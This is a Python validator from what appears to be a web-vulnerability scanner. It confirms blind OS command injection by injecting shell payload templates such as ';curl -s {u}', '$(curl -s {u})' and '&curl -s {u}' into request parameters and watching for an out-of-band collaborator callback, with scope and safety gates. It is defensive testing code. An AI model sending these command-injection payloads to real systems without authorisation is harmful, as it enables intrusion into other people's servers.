"""
OS command-injection confirmation leg (deterministic, OOB via the in-process
collaborator).

The command_injection agent can only GUESS that a parameter reaches a shell. This
proves it out-of-band the same way the SSRF/XXE legs do: inject a shell payload
whose only effect is to fetch a unique collaborator URL, send the request, and
watch for the target to CALL BACK. A callback is proof the injected command ran
-- confirmed command injection -- with zero reliance on the response body (blind
injection included) and without running any payload that reads, writes, or
destroys anything on the target (the fetch is the whole payload).

Fires on command_injection findings; injects into every query/body parameter.
Scope-gated; active (validators.active_enabled), and mutating replays of a non-GET
capture additionally need validators.allow_mutating_replay (safety gate).
"""
from __future__ import annotations

from urllib.parse import urlsplit

import httpx

import harness.collaborator as _collab
from harness import global_throttle
from harness.models import Finding, HttpExchange
from harness.safety_gate import GatedAsyncClient, get_default_gate, SafetyGateBlocked
from .base import Validator, ValidationResult
from .injection_targets import param_targets, mutate, replay_headers

# Shell metacharacters that break out of the surrounding command, tried in order.
# `{u}` is the collaborator URL. Covers POSIX (`;`, `|`, `$()`, backticks,
# newline) and Windows cmd (`&`), and both curl and wget as the fetch tool so the
# leg does not depend on which is installed. Each is a self-contained fetch: the
# callback alone is the signal, so no output needs to come back in-band.
_TEMPLATES = (
    ";curl -s {u}",
    ";wget -qO- {u}",
    "|curl -s {u}",
    "$(curl -s {u})",
    "`curl -s {u}`",
    "&curl -s {u}",
    "\ncurl -s {u}\n",
)
# Bound the fan-out: params x templates sends per finding.
_MAX_PARAMS = 6


class CommandInjectionValidator(Validator):
    name = "command_injection"
    finding_classes = {"command_injection", "command injection", "os command injection",
                       "rce", "remote code execution", "code injection", "shell injection"}
    active = True

    def __init__(self, *, allowed_hosts: list[str] | None = None, timeout: float = 10.0,
                 collaborator=None):
        self.allowed_hosts = allowed_hosts or []
        self.timeout = timeout
        self._collab = collaborator

    def collab(self):
        return self._collab or _collab.shared()

    def applies(self, finding: Finding, exchange: HttpExchange) -> bool:
        return super().applies(finding, exchange) and bool(param_targets(exchange))

    def _skip(self, why: str) -> ValidationResult:
        return ValidationResult(self.name, "skipped", "command_injection", summary=why)

    async def validate(self, finding: Finding, exchange: HttpExchange) -> ValidationResult:
        host = urlsplit(exchange.url).hostname or ""
        if self.allowed_hosts and host not in self.allowed_hosts:
            return self._skip(f"host {host!r} out of scope")
        targets = param_targets(exchange)[:_MAX_PARAMS]
        if not targets:
            return self._skip("no parameter to inject a shell payload into")
        collab = self.collab()
        method = (exchange.method or "GET").upper()
        headers = replay_headers(exchange)
        blocked = False
        for loc, param in targets:
            for tmpl in _TEMPLATES:
                token = collab.token()
                payload = tmpl.format(u=collab.url(token))
                url, body = mutate(exchange, loc, param, payload)
                try:
                    await global_throttle.acquire()
                    async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
                                                follow_redirects=False, verify=False) as client:
                        await client.request(method, url, headers=headers or None, content=body or None)
                except SafetyGateBlocked:
                    blocked = True
                    break  # mutating replay not authorized -- no point trying more templates
                except httpx.HTTPError:
                    continue
                if await collab.wait_for_hit(token, timeout=self.timeout):
                    return ValidationResult(
                        self.name, "confirmed", "command_injection", confidence=0.95, confirmed=True,
                        summary=f"OS command injection confirmed: a shell payload placed in the {loc} "
                                f"parameter {param!r} executed on the server.",
                        evidence=f"Injected a metacharacter-prefixed fetch (`{tmpl.format(u='<collaborator>')}`) "
                                 f"into {param!r}; the target ran it and called back out-of-band (blind-safe).")
            if blocked:
                break
        if blocked:
            return self._skip("mutating command-injection replay not authorized "
                              "(set validators.allow_mutating_replay)")
        return ValidationResult(
            self.name, "not_confirmed", "command_injection", confidence=0.0, confirmed=False,
            summary="No out-of-band callback observed -- parameters do not appear to reach a shell",
            evidence=f"Tried {len(targets)} parameter(s) x {len(_TEMPLATES)} shell payloads; "
                     f"no collaborator hit within the window.")
